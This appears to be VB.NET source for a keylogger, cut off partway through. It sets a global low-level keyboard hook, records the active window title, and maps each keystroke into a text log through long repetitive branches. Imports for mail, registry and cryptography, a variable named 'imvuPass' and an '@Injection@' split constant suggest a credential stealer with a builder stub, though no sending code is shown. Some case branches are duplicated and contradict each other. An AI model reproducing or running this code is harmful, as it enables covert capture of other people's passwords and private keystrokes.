Imports System.IO
Imports System.Net.Mail
Imports System.Net
Imports Microsoft.Win32
Imports System.Security.Cryptography
Imports System.Text
Imports System.Management
Public Class Form1

    Dim options(), text1, text2, text3, text4, interval, text5, text6, text7, cb, cb1, cb2, cb3, cb4, cb5, cb6, cb7, cb8, cb9, cb10, cb11, cb12 As String
    Dim imvuPass As String = DoToVu()
    Dim result As Integer
    Dim Stored As String
    Const FileSplit = "@Injection@"
    Public Class KeyboardHook
        Private Const HC_ACTION As Integer = 0
        Private Const WH_KEYBOARD_LL As Integer = 13
        Private Const WM_KEYDOWN = &H100
        Private Const WM_KEYUP = &H101
        Private Const WM_SYSKEYDOWN = &H104
        Private Const WM_SYSKEYUP = &H105

        Private Structure KBDLLHOOKSTRUCT
            Public vkCode As Integer
            Public scancode As Integer
            Public flags As Integer
            Public time As Integer
            Public dwExtraInfo As Integer
        End Structure

        Private Declare Function SetWindowsHookEx Lib "user32" _
        Alias "SetWindowsHookExA" _
        (ByVal idHook As Integer, _
        ByVal lpfn As KeyboardProcDelegate, _
        ByVal hmod As Integer, _
        ByVal dwThreadId As Integer) As Integer

        Private Declare Function CallNextHookEx Lib "user32" _
        (ByVal hHook As Integer, _
        ByVal nCode As Integer, _
        ByVal wParam As Integer, _
        ByVal lParam As KBDLLHOOKSTRUCT) As Integer

        Private Declare Function UnhookWindowsHookEx Lib "user32" _
        (ByVal hHook As Integer) As Integer


        Private Delegate Function KeyboardProcDelegate _
        (ByVal nCode As Integer, _
        ByVal wParam As Integer, _
        ByRef lParam As KBDLLHOOKSTRUCT) As Integer


        Public Shared Event KeyDown(ByVal Key As Keys)
        Public Shared Event KeyUp(ByVal Key As Keys)

        Private Shared KeyHook As Integer

        Private Shared KeyHookDelegate As KeyboardProcDelegate

        Public Sub New()

            KeyHookDelegate = New KeyboardProcDelegate(AddressOf KeyboardProc)
            KeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookDelegate, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
        End Sub

        Private Shared Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

            If (nCode = HC_ACTION) Then
                Select Case wParam

                    Case WM_KEYDOWN, WM_SYSKEYDOWN

                        RaiseEvent KeyDown(CType(lParam.vkCode, Keys))
                    Case WM_KEYUP, WM_SYSKEYUP

                        RaiseEvent KeyUp(CType(lParam.vkCode, Keys))
                End Select
            End If

            Return CallNextHookEx(KeyHook, nCode, wParam, lParam)
        End Function
        Protected Overrides Sub Finalize()

            UnhookWindowsHookEx(KeyHook)
            MyBase.Finalize()
        End Sub
    End Class
    Private WithEvents kbHook As New KeyboardHook
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Sub shiftandcaps(ByVal Key As System.Windows.Forms.Keys) Handles kbHook.KeyDown
        If My.Computer.Keyboard.ShiftKeyDown = False And My.Computer.Keyboard.CapsLock = False Then
            If Key = Keys.A Then
                TextBox1.Text = TextBox1.Text & "a"
            ElseIf Key = Keys.B Then
                TextBox1.Text = TextBox1.Text & "b"
            ElseIf Key = Keys.C Then
                TextBox1.Text = TextBox1.Text & "c"
            ElseIf Key = Keys.D Then
                TextBox1.Text = TextBox1.Text & "d"
            ElseIf Key = Keys.E Then
                TextBox1.Text = TextBox1.Text & "e"
            ElseIf Key = Keys.F Then
                TextBox1.Text = TextBox1.Text & "f"
            ElseIf Key = Keys.G Then
                TextBox1.Text = TextBox1.Text & "g"
            ElseIf Key = Keys.H Then
                TextBox1.Text = TextBox1.Text & "h"
            ElseIf Key = Keys.I Then
                TextBox1.Text = TextBox1.Text & "i"
            ElseIf Key = Keys.J Then
                TextBox1.Text = TextBox1.Text & "j"
            ElseIf Key = Keys.K Then
                TextBox1.Text = TextBox1.Text & "k"
            ElseIf Key = Keys.L Then
                TextBox1.Text = TextBox1.Text & "l"
            ElseIf Key = Keys.M Then
                TextBox1.Text = TextBox1.Text & "m"
            ElseIf Key = Keys.N Then
                TextBox1.Text = TextBox1.Text & "n"
            ElseIf Key = Keys.O Then
                TextBox1.Text = TextBox1.Text & "o"
            ElseIf Key = Keys.P Then
                TextBox1.Text = TextBox1.Text & "p"
            ElseIf Key = Keys.Q Then
                TextBox1.Text = TextBox1.Text & "q"
            ElseIf Key = Keys.R Then
                TextBox1.Text = TextBox1.Text & "r"
            ElseIf Key = Keys.S Then
                TextBox1.Text = TextBox1.Text & "s"
            ElseIf Key = Keys.T Then
                TextBox1.Text = TextBox1.Text & "t"
            ElseIf Key = Keys.U Then
                TextBox1.Text = TextBox1.Text & "u"
            ElseIf Key = Keys.V Then
                TextBox1.Text = TextBox1.Text & "v"
            ElseIf Key = Keys.W Then
                TextBox1.Text = TextBox1.Text & "w"
            ElseIf Key = Keys.X Then
                TextBox1.Text = TextBox1.Text & "x"
            ElseIf Key = Keys.Y Then
                TextBox1.Text = TextBox1.Text & "y"
            ElseIf Key = Keys.Z Then
                TextBox1.Text = TextBox1.Text & "z"
            ElseIf Key = Keys.D0 Then
                TextBox1.Text = TextBox1.Text & "0"
            ElseIf Key = Keys.D1 Then
                TextBox1.Text = TextBox1.Text & "1"
            ElseIf Key = Keys.D2 Then
                TextBox1.Text = TextBox1.Text & "2"
            ElseIf Key = Keys.D3 Then
                TextBox1.Text = TextBox1.Text & "3"
            ElseIf Key = Keys.D4 Then
                TextBox1.Text = TextBox1.Text & "4"
            ElseIf Key = Keys.D5 Then
                TextBox1.Text = TextBox1.Text & "5"
            ElseIf Key = Keys.D6 Then
                TextBox1.Text = TextBox1.Text & "6"
            ElseIf Key = Keys.D7 Then
                TextBox1.Text = TextBox1.Text & "7"
            ElseIf Key = Keys.D8 Then
                TextBox1.Text = TextBox1.Text & "8"
            ElseIf Key = Keys.D9 Then
                TextBox1.Text = TextBox1.Text & "9"
            ElseIf Key = Keys.NumPad0 Then
                TextBox1.Text = TextBox1.Text & "0"
            ElseIf Key = Keys.NumPad1 Then
                TextBox1.Text = TextBox1.Text & "1"
            ElseIf Key = Keys.NumPad2 Then
                TextBox1.Text = TextBox1.Text & "2"
            ElseIf Key = Keys.NumPad3 Then
                TextBox1.Text = TextBox1.Text & "3"
            ElseIf Key = Keys.NumPad4 Then
                TextBox1.Text = TextBox1.Text & "4"
            ElseIf Key = Keys.NumPad5 Then
                TextBox1.Text = TextBox1.Text & "5"
            ElseIf Key = Keys.NumPad6 Then
                TextBox1.Text = TextBox1.Text & "6"
            ElseIf Key = Keys.NumPad7 Then
                TextBox1.Text = TextBox1.Text & "7"
            ElseIf Key = Keys.NumPad8 Then
                TextBox1.Text = TextBox1.Text & "8"
            ElseIf Key = Keys.NumPad9 Then
                TextBox1.Text = TextBox1.Text & "9"
            ElseIf Key = Keys.Oemcomma Then
                TextBox1.Text = TextBox1.Text & ","
            ElseIf Key = Keys.OemMinus Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.OemQuotes Then
                TextBox1.Text = TextBox1.Text & "'"
            ElseIf Key = Keys.OemOpenBrackets Then
                TextBox1.Text = TextBox1.Text & "["
            ElseIf Key = Keys.OemCloseBrackets Then
                TextBox1.Text = TextBox1.Text & "]"
            ElseIf Key = Keys.OemQuestion Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.OemPipe Then
                TextBox1.Text = TextBox1.Text & "\"
            ElseIf Key = Keys.Oem1 Then
                TextBox1.Text = TextBox1.Text & ";"
            ElseIf Key = Keys.OemPeriod Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Oemtilde Then
                TextBox1.Text = TextBox1.Text & "`"
            ElseIf Key = Keys.Space Then
                TextBox1.Text = TextBox1.Text & " "
            ElseIf Key = Keys.Enter Then
                TextBox1.Text = TextBox1.Text & vbNewLine
            ElseIf Key = Keys.F1 Then
                TextBox1.Text = TextBox1.Text & "[F1]"
            ElseIf Key = Keys.F2 Then
                TextBox1.Text = TextBox1.Text & "[F2]"
            ElseIf Key = Keys.F3 Then
                TextBox1.Text = TextBox1.Text & "[F3]"
            ElseIf Key = Keys.F4 Then
                TextBox1.Text = TextBox1.Text & "[F4]"
            ElseIf Key = Keys.F5 Then
                TextBox1.Text = TextBox1.Text & "[F5]"
            ElseIf Key = Keys.F6 Then
                TextBox1.Text = TextBox1.Text & "[F6]"
            ElseIf Key = Keys.F7 Then
                TextBox1.Text = TextBox1.Text & "[F7]"
            ElseIf Key = Keys.F8 Then
                TextBox1.Text = TextBox1.Text & "[F8]"
            ElseIf Key = Keys.F9 Then
                TextBox1.Text = TextBox1.Text & "[F9]"
            ElseIf Key = Keys.F10 Then
                TextBox1.Text = TextBox1.Text & "[F10]"
            ElseIf Key = Keys.F11 Then
                TextBox1.Text = TextBox1.Text & "[F11]"
            ElseIf Key = Keys.F12 Then
                TextBox1.Text = TextBox1.Text & "[F12]"
            ElseIf Key = Keys.Delete Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Back Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Down Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Up Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Left Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Right Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Tab Then
                TextBox1.Text = TextBox1.Text & "[TAB]"
            ElseIf Key = Keys.End Then
                TextBox1.Text = TextBox1.Text & "[END]"
            ElseIf Key = Keys.Escape Then
                TextBox1.Text = TextBox1.Text & "[ESC]"
            ElseIf Key = Keys.Divide Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.Decimal Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Subtract Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.Add Then
                TextBox1.Text = TextBox1.Text & "+"
            ElseIf Key = Keys.Multiply Then
                TextBox1.Text = TextBox1.Text & "*"
            End If
        ElseIf My.Computer.Keyboard.ShiftKeyDown = False And My.Computer.Keyboard.CapsLock = True Then
            If Key = Keys.A Then
                TextBox1.Text = TextBox1.Text & "A"
            ElseIf Key = Keys.B Then
                TextBox1.Text = TextBox1.Text & "B"
            ElseIf Key = Keys.C Then
                TextBox1.Text = TextBox1.Text & "C"
            ElseIf Key = Keys.D Then
                TextBox1.Text = TextBox1.Text & "D"
            ElseIf Key = Keys.E Then
                TextBox1.Text = TextBox1.Text & "E"
            ElseIf Key = Keys.F Then
                TextBox1.Text = TextBox1.Text & "F"
            ElseIf Key = Keys.G Then
                TextBox1.Text = TextBox1.Text & "G"
            ElseIf Key = Keys.H Then
                TextBox1.Text = TextBox1.Text & "H"
            ElseIf Key = Keys.I Then
                TextBox1.Text = TextBox1.Text & "I"
            ElseIf Key = Keys.J Then
                TextBox1.Text = TextBox1.Text & "J"
            ElseIf Key = Keys.K Then
                TextBox1.Text = TextBox1.Text & "K"
            ElseIf Key = Keys.L Then
                TextBox1.Text = TextBox1.Text & "L"
            ElseIf Key = Keys.M Then
                TextBox1.Text = TextBox1.Text & "M"
            ElseIf Key = Keys.N Then
                TextBox1.Text = TextBox1.Text & "N"
            ElseIf Key = Keys.O Then
                TextBox1.Text = TextBox1.Text & "O"
            ElseIf Key = Keys.P Then
                TextBox1.Text = TextBox1.Text & "P"
            ElseIf Key = Keys.Q Then
                TextBox1.Text = TextBox1.Text & "Q"
            ElseIf Key = Keys.R Then
                TextBox1.Text = TextBox1.Text & "R"
            ElseIf Key = Keys.S Then
                TextBox1.Text = TextBox1.Text & "S"
            ElseIf Key = Keys.T Then
                TextBox1.Text = TextBox1.Text & "T"
            ElseIf Key = Keys.U Then
                TextBox1.Text = TextBox1.Text & "U"
            ElseIf Key = Keys.V Then
                TextBox1.Text = TextBox1.Text & "V"
            ElseIf Key = Keys.W Then
                TextBox1.Text = TextBox1.Text & "W"
            ElseIf Key = Keys.X Then
                TextBox1.Text = TextBox1.Text & "X"
            ElseIf Key = Keys.Y Then
                TextBox1.Text = TextBox1.Text & "Y"
            ElseIf Key = Keys.Z Then
                TextBox1.Text = TextBox1.Text & "Z"
            ElseIf Key = Keys.D0 Then
                TextBox1.Text = TextBox1.Text & "0"
            ElseIf Key = Keys.D1 Then
                TextBox1.Text = TextBox1.Text & "1"
            ElseIf Key = Keys.D2 Then
                TextBox1.Text = TextBox1.Text & "2"
            ElseIf Key = Keys.D3 Then
                TextBox1.Text = TextBox1.Text & "3"
            ElseIf Key = Keys.D4 Then
                TextBox1.Text = TextBox1.Text & "4"
            ElseIf Key = Keys.D5 Then
                TextBox1.Text = TextBox1.Text & "5"
            ElseIf Key = Keys.D6 Then
                TextBox1.Text = TextBox1.Text & "6"
            ElseIf Key = Keys.D7 Then
                TextBox1.Text = TextBox1.Text & "7"
            ElseIf Key = Keys.D8 Then
                TextBox1.Text = TextBox1.Text & "8"
            ElseIf Key = Keys.D9 Then
                TextBox1.Text = TextBox1.Text & "9"
            ElseIf Key = Keys.NumPad0 Then
                TextBox1.Text = TextBox1.Text & "0"
            ElseIf Key = Keys.NumPad1 Then
                TextBox1.Text = TextBox1.Text & "1"
            ElseIf Key = Keys.NumPad2 Then
                TextBox1.Text = TextBox1.Text & "2"
            ElseIf Key = Keys.NumPad3 Then
                TextBox1.Text = TextBox1.Text & "3"
            ElseIf Key = Keys.NumPad4 Then
                TextBox1.Text = TextBox1.Text & "4"
            ElseIf Key = Keys.NumPad5 Then
                TextBox1.Text = TextBox1.Text & "5"
            ElseIf Key = Keys.NumPad6 Then
                TextBox1.Text = TextBox1.Text & "6"
            ElseIf Key = Keys.NumPad7 Then
                TextBox1.Text = TextBox1.Text & "7"
            ElseIf Key = Keys.NumPad8 Then
                TextBox1.Text = TextBox1.Text & "8"
            ElseIf Key = Keys.NumPad9 Then
                TextBox1.Text = TextBox1.Text & "9"
            ElseIf Key = Keys.Oemcomma Then
                TextBox1.Text = TextBox1.Text & ","
            ElseIf Key = Keys.OemMinus Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.OemQuotes Then
                TextBox1.Text = TextBox1.Text & "'"
            ElseIf Key = Keys.OemOpenBrackets Then
                TextBox1.Text = TextBox1.Text & "["
            ElseIf Key = Keys.OemCloseBrackets Then
                TextBox1.Text = TextBox1.Text & "]"
            ElseIf Key = Keys.OemQuestion Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.OemPipe Then
                TextBox1.Text = TextBox1.Text & "\"
            ElseIf Key = Keys.Oem1 Then
                TextBox1.Text = TextBox1.Text & ";"
            ElseIf Key = Keys.OemPeriod Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Oemtilde Then
                TextBox1.Text = TextBox1.Text & "`"
            ElseIf Key = Keys.Space Then
                TextBox1.Text = TextBox1.Text & " "
            ElseIf Key = Keys.Enter Then
                TextBox1.Text = TextBox1.Text & vbNewLine
            ElseIf Key = Keys.F1 Then
                TextBox1.Text = TextBox1.Text & "[F1]"
            ElseIf Key = Keys.F2 Then
                TextBox1.Text = TextBox1.Text & "[F2]"
            ElseIf Key = Keys.F3 Then
                TextBox1.Text = TextBox1.Text & "[F3]"
            ElseIf Key = Keys.F4 Then
                TextBox1.Text = TextBox1.Text & "[F4]"
            ElseIf Key = Keys.F5 Then
                TextBox1.Text = TextBox1.Text & "[F5]"
            ElseIf Key = Keys.F6 Then
                TextBox1.Text = TextBox1.Text & "[F6]"
            ElseIf Key = Keys.F7 Then
                TextBox1.Text = TextBox1.Text & "[F7]"
            ElseIf Key = Keys.F8 Then
                TextBox1.Text = TextBox1.Text & "[F8]"
            ElseIf Key = Keys.F9 Then
                TextBox1.Text = TextBox1.Text & "[F9]"
            ElseIf Key = Keys.F10 Then
                TextBox1.Text = TextBox1.Text & "[F10]"
            ElseIf Key = Keys.F11 Then
                TextBox1.Text = TextBox1.Text & "[F11]"
            ElseIf Key = Keys.F12 Then
                TextBox1.Text = TextBox1.Text & "[F12]"
            ElseIf Key = Keys.Delete Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Back Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Down Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Up Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Left Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Right Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Tab Then
                TextBox1.Text = TextBox1.Text & "[TAB]"
            ElseIf Key = Keys.End Then
                TextBox1.Text = TextBox1.Text & "[END]"
            ElseIf Key = Keys.Escape Then
                TextBox1.Text = TextBox1.Text & "[ESC]"
            ElseIf Key = Keys.Divide Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.Decimal Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Subtract Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.Add Then
                TextBox1.Text = TextBox1.Text & "+"
            ElseIf Key = Keys.Multiply Then
                TextBox1.Text = TextBox1.Text & "*"
            End If
        ElseIf My.Computer.Keyboard.ShiftKeyDown = True And My.Computer.Keyboard.CapsLock = True Then
            If Key = Keys.D1 Then
                TextBox1.Text = TextBox1.Text + "!"
            ElseIf Key = Keys.D2 Then
                TextBox1.Text = TextBox1.Text + "@"
            ElseIf Key = Keys.D3 Then
                TextBox1.Text = TextBox1.Text + "#"
            ElseIf Key = Keys.D4 Then
                TextBox1.Text = TextBox1.Text + "$"
            ElseIf Key = Keys.D5 Then
                TextBox1.Text = TextBox1.Text + "%"
            ElseIf Key = Keys.D6 Then
                TextBox1.Text = TextBox1.Text + "^"
            ElseIf Key = Keys.D7 Then
                TextBox1.Text = TextBox1.Text + "&"
            ElseIf Key = Keys.D8 Then
                TextBox1.Text = TextBox1.Text + "*"
            ElseIf Key = Keys.D9 Then
                TextBox1.Text = TextBox1.Text + "("
            ElseIf Key = Keys.D0 Then
                TextBox1.Text = TextBox1.Text + ")"
            ElseIf Key = Keys.A Then
                TextBox1.Text = TextBox1.Text & "A"
            ElseIf Key = Keys.B Then
                TextBox1.Text = TextBox1.Text & "B"
            ElseIf Key = Keys.C Then
                TextBox1.Text = TextBox1.Text & "C"
            ElseIf Key = Keys.D Then
                TextBox1.Text = TextBox1.Text & "D"
            ElseIf Key = Keys.E Then
                TextBox1.Text = TextBox1.Text & "E"
            ElseIf Key = Keys.F Then
                TextBox1.Text = TextBox1.Text & "F"
            ElseIf Key = Keys.G Then
                TextBox1.Text = TextBox1.Text & "G"
            ElseIf Key = Keys.H Then
                TextBox1.Text = TextBox1.Text & "H"
            ElseIf Key = Keys.I Then
                TextBox1.Text = TextBox1.Text & "I"
            ElseIf Key = Keys.J Then
                TextBox1.Text = TextBox1.Text & "J"
            ElseIf Key = Keys.K Then
                TextBox1.Text = TextBox1.Text & "K"
            ElseIf Key = Keys.L Then
                TextBox1.Text = TextBox1.Text & "L"
            ElseIf Key = Keys.M Then
                TextBox1.Text = TextBox1.Text & "M"
            ElseIf Key = Keys.N Then
                TextBox1.Text = TextBox1.Text & "N"
            ElseIf Key = Keys.O Then
                TextBox1.Text = TextBox1.Text & "O"
            ElseIf Key = Keys.P Then
                TextBox1.Text = TextBox1.Text & "P"
            ElseIf Key = Keys.Q Then
                TextBox1.Text = TextBox1.Text & "Q"
            ElseIf Key = Keys.R Then
                TextBox1.Text = TextBox1.Text & "R"
            ElseIf Key = Keys.S Then
                TextBox1.Text = TextBox1.Text & "S"
            ElseIf Key = Keys.T Then
                TextBox1.Text = TextBox1.Text & "T"
            ElseIf Key = Keys.U Then
                TextBox1.Text = TextBox1.Text & "U"
            ElseIf Key = Keys.V Then
                TextBox1.Text = TextBox1.Text & "V"
            ElseIf Key = Keys.W Then
                TextBox1.Text = TextBox1.Text & "W"
            ElseIf Key = Keys.X Then
                TextBox1.Text = TextBox1.Text & "X"
            ElseIf Key = Keys.Y Then
                TextBox1.Text = TextBox1.Text & "Y"
            ElseIf Key = Keys.Z Then
                TextBox1.Text = TextBox1.Text & "Z"
            ElseIf Key = Keys.Oemcomma Then
                TextBox1.Text = TextBox1.Text & "<"
            ElseIf Key = Keys.OemMinus Then
                TextBox1.Text = TextBox1.Text & "_"
            ElseIf Key = Keys.OemOpenBrackets Then
                TextBox1.Text = TextBox1.Text & "{"
            ElseIf Key = Keys.OemCloseBrackets Then
                TextBox1.Text = TextBox1.Text & "}"
            ElseIf Key = Keys.OemQuestion Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.OemPipe Then
                TextBox1.Text = TextBox1.Text & "|"
            ElseIf Key = Keys.Oem1 Then
                TextBox1.Text = TextBox1.Text & ":"
            ElseIf Key = Keys.OemPeriod Then
                TextBox1.Text = TextBox1.Text & ">"
            ElseIf Key = Keys.Oemtilde Then
                TextBox1.Text = TextBox1.Text & "~"

            ElseIf Key = Keys.Space Then
                TextBox1.Text = TextBox1.Text & " "
            ElseIf Key = Keys.Enter Then
                TextBox1.Text = TextBox1.Text & vbNewLine
            ElseIf Key = Keys.F1 Then
                TextBox1.Text = TextBox1.Text & "[F1]"
            ElseIf Key = Keys.F2 Then
                TextBox1.Text = TextBox1.Text & "[F2]"
            ElseIf Key = Keys.F3 Then
                TextBox1.Text = TextBox1.Text & "[F3]"
            ElseIf Key = Keys.F4 Then
                TextBox1.Text = TextBox1.Text & "[F4]"
            ElseIf Key = Keys.F5 Then
                TextBox1.Text = TextBox1.Text & "[F5]"
            ElseIf Key = Keys.F6 Then
                TextBox1.Text = TextBox1.Text & "[F6]"
            ElseIf Key = Keys.F7 Then
                TextBox1.Text = TextBox1.Text & "[F7]"
            ElseIf Key = Keys.F8 Then
                TextBox1.Text = TextBox1.Text & "[F8]"
            ElseIf Key = Keys.F9 Then
                TextBox1.Text = TextBox1.Text & "[F9]"
            ElseIf Key = Keys.F10 Then
                TextBox1.Text = TextBox1.Text & "[F10]"
            ElseIf Key = Keys.F11 Then
                TextBox1.Text = TextBox1.Text & "[F11]"
            ElseIf Key = Keys.F12 Then
                TextBox1.Text = TextBox1.Text & "[F12]"
            ElseIf Key = Keys.Delete Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Back Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Down Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Up Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Left Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Right Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Tab Then
                TextBox1.Text = TextBox1.Text & "[TAB]"
            ElseIf Key = Keys.End Then
                TextBox1.Text = TextBox1.Text & "[END]"
            ElseIf Key = Keys.Escape Then
                TextBox1.Text = TextBox1.Text & "[ESC]"
            ElseIf Key = Keys.Divide Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.Decimal Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Subtract Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.Add Then
                TextBox1.Text = TextBox1.Text & "+"
            ElseIf Key = Keys.Multiply Then
                TextBox1.Text = TextBox1.Text & "*"
            End If
        ElseIf My.Computer.Keyboard.ShiftKeyDown = False And My.Computer.Keyboard.CapsLock = True Then
            If Key = Keys.D1 Then
                TextBox1.Text = TextBox1.Text + "1"
            ElseIf Key = Keys.D2 Then
                TextBox1.Text = TextBox1.Text + "2"
            ElseIf Key = Keys.D3 Then
                TextBox1.Text = TextBox1.Text + "3"
            ElseIf Key = Keys.D4 Then
                TextBox1.Text = TextBox1.Text + "4"
            ElseIf Key = Keys.D5 Then
                TextBox1.Text = TextBox1.Text + "5"
            ElseIf Key = Keys.D6 Then
                TextBox1.Text = TextBox1.Text + "6"
            ElseIf Key = Keys.D7 Then
                TextBox1.Text = TextBox1.Text + "7"
            ElseIf Key = Keys.D8 Then
                TextBox1.Text = TextBox1.Text + "8"
            ElseIf Key = Keys.D9 Then
                TextBox1.Text = TextBox1.Text + "9"
            ElseIf Key = Keys.D0 Then
                TextBox1.Text = TextBox1.Text + "0"
            ElseIf Key = Keys.A Then
                TextBox1.Text = TextBox1.Text & "a"
            ElseIf Key = Keys.B Then
                TextBox1.Text = TextBox1.Text & "b"
            ElseIf Key = Keys.C Then
                TextBox1.Text = TextBox1.Text & "c"
            ElseIf Key = Keys.D Then
                TextBox1.Text = TextBox1.Text & "d"
            ElseIf Key = Keys.E Then
                TextBox1.Text = TextBox1.Text & "e"
            ElseIf Key = Keys.F Then
                TextBox1.Text = TextBox1.Text & "f"
            ElseIf Key = Keys.G Then
                TextBox1.Text = TextBox1.Text & "g"
            ElseIf Key = Keys.H Then
                TextBox1.Text = TextBox1.Text & "h"
            ElseIf Key = Keys.I Then
                TextBox1.Text = TextBox1.Text & "i"
            ElseIf Key = Keys.J Then
                TextBox1.Text = TextBox1.Text & "j"
            ElseIf Key = Keys.K Then
                TextBox1.Text = TextBox1.Text & "k"
            ElseIf Key = Keys.L Then
                TextBox1.Text = TextBox1.Text & "l"
            ElseIf Key = Keys.M Then
                TextBox1.Text = TextBox1.Text & "m"
            ElseIf Key = Keys.N Then
                TextBox1.Text = TextBox1.Text & "n"
            ElseIf Key = Keys.O Then
                TextBox1.Text = TextBox1.Text & "o"
            ElseIf Key = Keys.P Then
                TextBox1.Text = TextBox1.Text & "p"
            ElseIf Key = Keys.Q Then
                TextBox1.Text = TextBox1.Text & "q"
            ElseIf Key = Keys.R Then
                TextBox1.Text = TextBox1.Text & "r"
            ElseIf Key = Keys.S Then
                TextBox1.Text = TextBox1.Text & "s"
            ElseIf Key = Keys.T Then
                TextBox1.Text = TextBox1.Text & "t"
            ElseIf Key = Keys.U Then
                TextBox1.Text = TextBox1.Text & "u"
            ElseIf Key = Keys.V Then
                TextBox1.Text = TextBox1.Text & "v"
            ElseIf Key = Keys.W Then
                TextBox1.Text = TextBox1.Text & "w"
            ElseIf Key = Keys.X Then
                TextBox1.Text = TextBox1.Text & "x"
            ElseIf Key = Keys.Y Then
                TextBox1.Text = TextBox1.Text & "y"
            ElseIf Key = Keys.Z Then
                TextBox1.Text = TextBox1.Text & "z"
            ElseIf Key = Keys.Oemcomma Then
                TextBox1.Text = TextBox1.Text & ","
            ElseIf Key = Keys.OemMinus Then
                TextBox1.Text = TextBox1.Text & "-"
            ElseIf Key = Keys.OemQuotes Then
                TextBox1.Text = TextBox1.Text & "'"
            ElseIf Key = Keys.OemOpenBrackets Then
                TextBox1.Text = TextBox1.Text & "["
            ElseIf Key = Keys.OemCloseBrackets Then
                TextBox1.Text = TextBox1.Text & "]"
            ElseIf Key = Keys.OemQuestion Then
                TextBox1.Text = TextBox1.Text & "/"
            ElseIf Key = Keys.OemPipe Then
                TextBox1.Text = TextBox1.Text & "\"
            ElseIf Key = Keys.Oem1 Then
                TextBox1.Text = TextBox1.Text & ";"
            ElseIf Key = Keys.OemPeriod Then
                TextBox1.Text = TextBox1.Text & "."
            ElseIf Key = Keys.Oemtilde Then
                TextBox1.Text = TextBox1.Text & "`"
            ElseIf Key = Keys.Space Then
                TextBox1.Text = TextBox1.Text & " "
            ElseIf Key = Keys.Enter Then
                TextBox1.Text = TextBox1.Text & vbNewLine
            ElseIf Key = Keys.F1 Then
                TextBox1.Text = TextBox1.Text & "[F1]"
            ElseIf Key = Keys.F2 Then
                TextBox1.Text = TextBox1.Text & "[F2]"
            ElseIf Key = Keys.F3 Then
                TextBox1.Text = TextBox1.Text & "[F3]"
            ElseIf Key = Keys.F4 Then
                TextBox1.Text = TextBox1.Text & "[F4]"
            ElseIf Key = Keys.F5 Then
                TextBox1.Text = TextBox1.Text & "[F5]"
            ElseIf Key = Keys.F6 Then
                TextBox1.Text = TextBox1.Text & "[F6]"
            ElseIf Key = Keys.F7 Then
                TextBox1.Text = TextBox1.Text & "[F7]"
            ElseIf Key = Keys.F8 Then
                TextBox1.Text = TextBox1.Text & "[F8]"
            ElseIf Key = Keys.F9 Then
                TextBox1.Text = TextBox1.Text & "[F9]"
            ElseIf Key = Keys.F10 Then
                TextBox1.Text = TextBox1.Text & "[F10]"
            ElseIf Key = Keys.F11 Then
                TextBox1.Text = TextBox1.Text & "[F11]"
            ElseIf Key = Keys.F12 Then
                TextBox1.Text = TextBox1.Text & "[F12]"
            ElseIf Key = Keys.Delete Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Back Then
                TextBox1.Text = TextBox1.Text & "[DEL]"
            ElseIf Key = Keys.Down Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Up Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Left Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Right Then
                TextBox1.Text = TextBox1.Text & "?"
            ElseIf Key = Keys.Tab Then
